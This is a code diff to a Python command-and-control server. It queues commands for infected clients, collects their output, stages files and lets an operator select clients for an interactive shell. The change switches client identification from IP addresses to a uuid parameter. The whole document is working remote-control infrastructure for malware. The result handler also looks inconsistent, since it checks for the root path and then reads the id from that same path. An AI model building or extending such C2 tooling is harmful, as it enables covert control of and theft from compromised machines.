@@ -4,6 +4,7 @@ import threading
 import os
 import time
 import requests
+from urllib.parse import urlparse, parse_qs
 
 # A dictionary to hold connected clients and their command queues
 clients = {}
@@ -23,19 +24,21 @@ class C2Handler(BaseHTTPRequestHandler):
         global staged_file
 
         # Handle /command request (client asking for the next command)
-        if self.path == '/':
-            client_ip = self.client_address[0]
+        if self.path.startswith('/'):
+            parsed_url = urlparse(self.path)
+            query_params = parse_qs(parsed_url.query)
+            client_id = query_params.get('uuid', [None])[0]
 
             # Check if the client is registered
-            if client_ip in clients:
+            if client_id in clients:
                 # Check if there are commands queued for the client
-                if clients[client_ip]['commands']:
-                    command = clients[client_ip]['commands'].pop(0)
+                if clients[client_id]['commands']:
+                    command = clients[client_id]['commands'].pop(0)
                     self.send_response(200)
                     self.send_header('Content-type', 'application/json')
                     self.end_headers()
                     self.wfile.write(json.dumps({'command': command}).encode())
-                    print(f"Sent command to {client_ip}: {command}")
+                    print(f"Sent command to {client_id}: {command}")
                 else:
                     # No command queued, send "none"
                     self.send_response(200)
@@ -44,8 +47,8 @@ class C2Handler(BaseHTTPRequestHandler):
                     self.wfile.write(json.dumps({'command': 'none'}).encode())
             else:
                 # Register the client if not already registered
-                clients[client_ip] = {'commands': [], 'interactive': False}
-                print(f"New client connected: {client_ip}")
+                clients[client_id] = {'commands': [], 'interactive': False}
+                print(f"New client connected: {client_id}")
                 self.send_response(200)
                 self.send_header('Content-type', 'application/json')
                 self.end_headers()
@@ -68,12 +71,12 @@ class C2Handler(BaseHTTPRequestHandler):
         
         # Handle /result request (client sending command output back)
         if self.path == '/':
-            client_ip = self.client_address[0]
+            client_id = self.path.split('/')[-1]
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
             result = json.loads(post_data.decode())
 
-            print(f"Received result from {client_ip}: {result['output']}")
+            print(f"Received result from {client_id}: {result['output']}")
             self.send_response(200)
             self.end_headers()
         
@@ -103,32 +106,24 @@ def stage_file():
     else:
         print(f"File not found: {file_path}")
 
-def select_client(client_ip):
+def select_client(client_id):
     global current_client
-    if client_ip == current_client:
+    if client_id == current_client:
         current_client = None
-        clients[client_ip]['interactive'] = False
-        print(f"Client No Longer Selected: {client_ip}")
-    elif client_ip in clients:
-        current_client = client_ip
-        clients[client_ip]['interactive'] = True  # Set client to interactive mode
-        print(f"Switched to client: {client_ip}")
+        clients[client_id]['interactive'] = False
+        print(f"Client No Longer Selected: {client_id}")
+    elif client_id in clients:
+        current_client = client_id
+        clients[client_id]['interactive'] = True  # Set client to interactive mode
+        print(f"Switched to client: {client_id}")
     else:
-        print(f"Client {client_ip} not found.")
+        print(f"Client {client_id} not found.")
 
 if __name__ == "__main__":
     # Start server in a separate thread
     server_thread = threading.Thread(target=run_server)
     server_thread.daemon = True
     server_thread.start()
-    clients["10.1.0.11"] = {'commands': [], 'interactive': False}
-    clients["10.1.0.12"] = {'commands': [], 'interactive': False}
-    clients["10.1.0.13"] = {'commands': [], 'interactive': False}
-    clients["10.1.0.14"] = {'commands': [], 'interactive': False}
-    clients["10.2.0.11"] = {'commands': [], 'interactive': False}
-    clients["10.2.0.12"] = {'commands': [], 'interactive': False}
-    clients["10.2.0.13"] = {'commands': [], 'interactive': False}
-    clients["10.2.0.14"] = {'commands': [], 'interactive': False}
 
     while True:
         os.system('clear')
@@ -144,16 +139,16 @@ if __name__ == "__main__":
         if choice == "1":
             print("Connected clients:")
             count = 0
-            for client_ip in clients:
+            for client_id in clients:
                 count+=1
-                status = 'In shell' if clients[client_ip]['interactive'] else 'Idle'
-                print(f"{count}. {client_ip} - {status}")
+                status = 'In shell' if clients[client_id]['interactive'] else 'Idle'
+                print(f"{count}. {client_id} - {status}")
                 input("\nPress enter to continue...")
         elif choice == "2":
             if clients:
                 print("\nChoose a client by number:")
-                for idx, client_ip in enumerate(clients):
-                    print(f"{idx + 1}. {client_ip}")
+                for idx, client_id in enumerate(clients):
+                    print(f"{idx + 1}. {client_id}")
                 client_choice = input("> ")
                 try:
                     client_choice = int(client_choice) - 1
